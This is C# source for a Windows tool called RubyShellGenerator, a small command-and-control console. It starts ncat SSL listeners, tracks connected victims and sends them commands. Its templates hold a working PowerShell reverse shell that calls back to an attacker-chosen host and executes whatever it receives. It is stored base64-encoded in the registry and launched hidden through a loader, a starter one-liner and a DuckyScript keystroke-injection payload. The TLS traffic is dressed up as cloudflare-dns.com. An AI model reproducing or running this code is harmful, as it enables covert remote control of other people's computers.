using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace RubyShellGenerator
{
    public partial class Form1 : Form
    {
        private readonly Templates _tpl = new Templates();
        private readonly Dictionary<int, Process> _listeners = new Dictionary<int, Process>();
        private readonly Dictionary<int, ClientInfo> _clients = new Dictionary<int, ClientInfo>();

        public Form1()
        {
            InitializeComponent();
            dgvPorts.Rows.Clear();
            dgvClients.Rows.Clear();

            dgvPorts.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            dgvClients.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
        }

        private async void btnGeneratePayload_Click(object sender, EventArgs e)
        {
            if (!ValidateSettings(out string host, out int port, out string regPath))
                return;

            try
            {
                if (!chkSkipNetworkTest.Checked)
                    await PerformBindTest(port);
                UpdatePortGrid(port, active: false, connections: 0);
                GenerateAndLogPayloads(host, port.ToString(), regPath);
            }
            catch (OperationCanceledException)
            {
            }
        }

        private async Task PerformBindTest(int port)
        {
            var psi = new ProcessStartInfo
            {
                FileName = "ncat",
                Arguments = $"--ssl -lnvp {port}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var proc = Process.Start(psi);
            await Task.Delay(500);
            proc.Kill();
            InvokeLog($"[Info] Verified ncat can bind on port {port}.");
        }

        // Context menu: Enable port
        private void portEnable_Click(object sender, EventArgs e)
        {
            if (dgvPorts.SelectedRows.Count == 0) return;
            var row = dgvPorts.SelectedRows[0];
            int port = Convert.ToInt32(row.Cells[0].Value);
            StartListener(port, row);
        }

        // Context menu: Disable port
        private void portDisable_Click(object sender, EventArgs e)
        {
            if (dgvPorts.SelectedRows.Count == 0) return;
            var row = dgvPorts.SelectedRows[0];
            int port = Convert.ToInt32(row.Cells[0].Value);
            StopListener(port, row);
        }

        private void StartListener(int port, DataGridViewRow row)
        {
            if (_listeners.ContainsKey(port)) return;
            var psi = new ProcessStartInfo
            {
                FileName = "ncat",
                Arguments = $"--ssl -lnvp {port}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                RedirectStandardInput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };
            proc.OutputDataReceived += (s, evt) => OnListenerOutput(port, evt.Data);
            proc.ErrorDataReceived += (s, evt) => OnListenerOutput(port, evt.Data);
            try
            {
                proc.Start();
                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();
                _listeners[port] = proc;
                row.Cells[1].Value = true;
                InvokeLog($"[Listener] Started on port {port}.");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start listener: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void StopListener(int port, DataGridViewRow row)
        {
            if (!_listeners.TryGetValue(port, out var proc)) return;
            try
            {
                proc.Kill(); proc.WaitForExit();
            }
            catch { }
            finally
            {
                _listeners.Remove(port);
                row.Cells[1].Value = false;
                row.Cells[2].Value = 0;
                ClearClientsForPort(port);
                InvokeLog($"[Listener] Stopped on port {port}.");
            }
        }

        private void OnListenerOutput(int port, string data)
        {
            if (string.IsNullOrEmpty(data)) return;
            InvokeLog($"[ncat:{port}] {data}");
            if (data.StartsWith("Ncat: Connection from"))
            {
                var parts = data.Split(' ');
                var endpoint = parts[^1].TrimEnd('.');
                var split = endpoint.Split(':'); var ip = split[0];
                var clientPort = int.Parse(split[1]);
                var client = new ClientInfo { IP = ip, Port = clientPort, Status = "Connected", LastActive = DateTime.Now };
                _clients[port] = client;
                UpdateClientGrid();
                UpdatePortConnections(port, _clients.Count);
            }
        }

        // Context menu: Disconnect client
        private void clientDisconnect_Click(object sender, EventArgs e)
        {
            if (dgvClients.SelectedRows.Count == 0) return;
            var crow = dgvClients.SelectedRows[0];
            int port = Convert.ToInt32(crow.Cells[1].Value);
            // Restart listener to drop connection
            if (dgvPorts.Rows.Cast<DataGridViewRow>().FirstOrDefault(r => (int)r.Cells[0].Value == port) is DataGridViewRow prow)
            {
                StopListener(port, prow);
                StartListener(port, prow);
            }
        }

        // Context menu: Access client
        private void clientAccess_Click(object sender, EventArgs e)
        {
            if (dgvClients.SelectedRows.Count == 0) return;
            var port = Convert.ToInt32(dgvClients.SelectedRows[0].Cells[1].Value);
            if (_listeners.TryGetValue(port, out var proc))
            {
                var clientForm = new ClientForm(proc, port);
                clientForm.Show();
            }
        }

        private void btnSendCommand_Click(object sender, EventArgs e)
        {
            if (dgvClients.SelectedRows.Count == 0) return;
            var port = Convert.ToInt32(dgvClients.SelectedRows[0].Cells[1].Value);
            var cmd = txtListenerInput.Text;
            if (_listeners.TryGetValue(port, out var proc) && !proc.HasExited)
            {
                proc.StandardInput.WriteLine(cmd);
                InvokeLog($"[you->{port}] {cmd}"); txtListenerInput.Clear();
            }
        }

        private void GenerateAndLogPayloads(string host, string port, string regPath)
        {
            progressBar.Value = 0;
            var payload = _tpl.TCPpayload.Replace("<TCPIP>", host).Replace("<TCP>", port);
            progressBar.Value = 50;
            var loader = _tpl.LoaderTemplate.Replace("<TCP_PAYLOAD>", payload)
                                            .Replace("<REG_PATH>", regPath.Replace("\\", "\\\\"));
            progressBar.Value = 100;
            InvokeLog("=== Loader Script (run once) ===\n" + loader);
            InvokeLog("=== Starter Command ===\n" + _tpl.StarterTemplate.Replace("<REG_PATH>", regPath.Replace("\\", "\\\\")));
            InvokeLog("=== DuckyScript ===\n" + _tpl.DuckyscriptTemplate);
        }

        private bool ValidateSettings(out string host, out int port, out string regPath)
        {
            host = txtIP.Text.Trim(); regPath = txtRegistryPath.Text.Trim();
            if (!int.TryParse(txtPort.Text.Trim(), out port) || string.IsNullOrEmpty(host) || string.IsNullOrEmpty(regPath))
            {
                MessageBox.Show("Enter valid LHOST, LPORT, and Registry Path.", "Input Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return false;
            }
            return true;
        }

        private void InvokeLog(string text)
        {
            if (txtLog.InvokeRequired) txtLog.Invoke(new Action(() => txtLog.AppendText(text + "\n")));
            else txtLog.AppendText(text + "\n");
        }

        private void UpdatePortGrid(int port, bool active, int connections)
        {
            if (dgvPorts == null) return;
            foreach (DataGridViewRow row in dgvPorts.Rows)
            {
                if (row.Cells[0].Value != null && int.TryParse(row.Cells[0].Value.ToString(), out int p) && p == port)
                {
                    row.Cells[1].Value = active;
                    row.Cells[2].Value = connections;
                    return;
                }
            }
            dgvPorts.Rows.Add(port, active, connections);
        }

        private void UpdatePortConnections(int port, int count)
        {
            foreach (DataGridViewRow row in dgvPorts.Rows)
            {
                if ((int)row.Cells[0].Value == port)
                {
                    row.Cells[2].Value = count; return;
                }
            }
        }

        private void UpdateClientGrid()
        {
            dgvClients.Rows.Clear();
            foreach (var kv in _clients)
            {
                dgvClients.Rows.Add(kv.Value.IP, kv.Key, kv.Value.Status, kv.Value.LastActive);
            }
        }

        private void ClearClientsForPort(int port)
        {
            _clients.Remove(port);
            UpdateClientGrid();
        }
    }

    public class Templates
    {
        // RubyShell Payload (TCP) Template with placeholders <TCPIP> and <TCP>
        public string TCPpayload = """
            while($true){try{$sslProtocols=[System.Security.Authentication.SslProtocols]::Tls12; $TCPClient=New-Object Net.Sockets.TCPClient('<TCPIP>',<TCP>); $NetworkStream=$TCPClient.GetStream(); $SslStream=New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false); if(-not $SslStream.IsEncrypted -or -not $SslStream.IsSigned){$SslStream.Close();throw "SSL connection failed: not encrypted or not signed."}; break}catch{Write-Host "Connection failed. Retrying in 10 seconds..."; Start-Sleep -Seconds 10}}; $StreamWriter=New-Object IO.StreamWriter($SslStream); function WriteToStream($String){[byte[]]$script:Buffer=New-Object System.Byte[] 4096; $StreamWriter.Write($String+'RUBYSHELL> '); $StreamWriter.Flush()}; WriteToStream ''; while(($BytesRead=$SslStream.Read($Buffer,0,$Buffer.Length)) -gt 0){$Command=([Text.Encoding]::UTF8).GetString($Buffer,0,$BytesRead-1); $Output=try{Invoke-Expression $Command 2>&1 | Out-String}catch{$_|Out-String}; WriteToStream $Output}; $StreamWriter.Close()
            """;

        public string LoaderTemplate = """
            # RubyShell Loader — writes the shell payload into <REG_PATH>
            $payload = @'
            <TCP_PAYLOAD>
            '@
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
            New-Item -Path '<REG_PATH>' -Force | Out-Null
            Set-ItemProperty -Path '<REG_PATH>' `
                -Name 'EncodedCode' -Value $encoded
            Write-Host "Payload stored in registry."

            # Run the payload
            $cmd = \"powershell -NoProfile -WindowStyle Hidden -c `\\\"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path '<REG_PATH>' -Name 'EncodedCode').EncodedCode)))`\\\"\"
            $proc = New-Object System.Diagnostics.Process
            $proc.StartInfo.FileName = "powershell"
            $proc.StartInfo.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)))"
            $proc.StartInfo.UseShellExecute = $false
            $proc.StartInfo.RedirectStandardOutput = $true
            $proc.StartInfo.RedirectStandardError = $true
            $proc.StartInfo.CreateNoWindow = $true
            $proc.Start() | Out-Null
            """;

        public string StarterTemplate = """
            powershell -NoProfile -WindowStyle Hidden -c "Invoke-Expression ([Text.Encoding]::Unicode.GetString( [Convert]::FromBase64String( (Get-ItemProperty -Path '<REG_PATH>' -Name 'EncodedCode').EncodedCode ) ))"
            """;

        public string DuckyscriptTemplate = """
            DELAY 1000
            GUI r
            DELAY 500
            STRING powershell -NoProfile -WindowStyle Hidden -c \"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path '<REG_PATH>' -Name 'EncodedCode').EncodedCode)))\" 
            ENTER
            """;
    }

    public class ClientInfo
    {
        public string IP { get; set; }
        public int Port { get; set; }
        public string Status { get; set; }
        public DateTime LastActive { get; set; }
    }
}
